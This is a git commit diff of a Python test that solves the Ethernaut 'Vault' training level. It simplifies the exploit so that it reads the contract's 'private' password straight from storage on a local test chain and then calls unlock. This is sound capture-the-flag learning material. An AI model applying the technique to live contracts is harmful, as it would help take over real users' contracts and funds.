54440eed2d207b507a5f67d1f0d8bb8476de583e
honzaprevratil <honzikprevratil@gmail.com>
2024-03-19 11:14:37 +0100

    ♻️ Vault solution simplified

--- tests/lv08_vault_test.py
+++ tests/lv08_vault_test.py
@@ -7,23 +7,14 @@ from pytypes.contracts.lv08_vault import Vault
 def test_lv08():
     ethernaut = EthernautDeployer(default_chain)
     contract = ethernaut.deploy_lv08()
-    exploit_lv08(contract, default_chain)
+    exploit_lv08(contract)
     ethernaut.check_lv08(contract)
 
-def exploit_lv08(contract: Vault, blockchain: Chain):
+def exploit_lv08(contract: Vault):
     # Attack vector: Blockchain is public, no data can be hidden
-    # Training: Representation of blockchain inside the testing framework - in reality you use blockchain explorer
-
-    # find the first block with non-zero transactions count
-    block = next(block for block in blockchain.blocks if len(block.txs) > 0)
-    # get that blocks first transaction and it's data
-    txData = block.txs[0].data
-    # get call data string => sub bytes between the transaction ending sequence and padding
-    txEndSeq = txData.index(b"\x18\x00")
-    padding  = txData.index(b"\x00\x00\x00\x00")
-    key = txData[txEndSeq + len(b"\x18\x00") + 1: padding]
-
+    # Training: Reading from local blockchain using the testing framework - for mainnet/testnet you can use blockchain explorer
+    key = read_storage_variable(Account(contract.address), "password")
     print(f"Extracted key: {key}")
-    
+
     # unlock the contract with extracted key
     contract.unlock(key)
